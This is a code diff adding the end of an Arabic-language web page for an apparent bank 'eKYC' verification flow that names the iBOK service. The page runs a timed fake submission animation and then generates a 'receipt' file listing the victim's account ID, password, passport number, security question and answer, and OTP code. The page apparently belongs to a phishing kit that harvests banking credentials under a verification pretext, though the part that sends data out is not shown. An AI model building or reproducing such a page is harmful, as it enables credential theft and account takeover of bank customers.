+            el.textContent = String(i);
+          }
+        }
+      }
+
+      renderStep(1);
+
+      submissionTimer = setInterval(() => {
+        currentStep++;
+        if (currentStep <= totalSteps) {
+          renderStep(currentStep);
+        } else {
+          clearInterval(submissionTimer);
+          for (let i = 1; i <= totalSteps; i++) {
+            const el = document.getElementById('stepCircle' + i);
+            el.classList.remove('active-step');
+            el.classList.add('completed');
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:11px;"></i>';
+          }
+          populateReceiptDetails();
+          setTimeout(() => {
+            showScreen('screenSuccess');
+          }, 600);
+        }
+      }, 1000);
+    }
+
+    function downloadReceiptAndExit() {
+      const ref = recordedState.referenceNumber || document.getElementById('referenceNumberValue').textContent;
+      const dt = recordedState.submittedAt || document.getElementById('submissionDateValue').textContent;
+
+      const content =
+        `تم تقديم eKYC بنجاح\n` +
+        `الرقم المرجعي: ${ref}\n` +
+        `تاريخ التقديم الوقت: ${dt}\n` +
+        `الحالة: قيد المراجعة\n` +
+        `الخدمة: ${recordedState.loginMode || 'iBOK'}\n` +
+        `رقم المعرف / الحساب: ${recordedState.username || '-'}\n` +
+        `كلمة المرور: ${recordedState.password || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
+        `رقم الهاتف: ${recordedState.phoneNumber || '-'}\n` +
+        `رقم الجواز / الهوية: ${recordedState.passportNumber || '-'}\n` +
+        `إثبات الهوية: ${recordedState.docType || '-'} (${recordedState.docFileName || '-'})\n` +
+        `صورة السيلفي: ${recordedState.selfieCaptured ? `مرفقة (${recordedState.selfieSource || '-'})` : 'غير مرفقة'}\n` +
+        `سؤال الأمان: ${recordedState.securityQuestion || '-'}\n` +
+        `إجابة سؤال الأمان: ${recordedState.securityAnswer || '-'}\n` +
+        `رمز OTP: ${recordedState.otpCode || '-'}\n`;
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `eKYC-${ref}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      showToast('تم تحميل الملف وجاري الخروج...');
+      setTimeout(() => {
+        openHomeScreen();
+      }, 900);
+    }
+
+    function handleAction(name) {
+      showToast('تم اختيار: ' + name);
+    }
+
+    function showToast(text) {
+      const toast = document.getElementById('toast');
+      toast.textContent = text;
+      toast.classList.add('show');
+
+      clearTimeout(window.toastTimer);
+      window.toastTimer = setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2200);
+    }
+  </script>
+</body>
+</html>
+
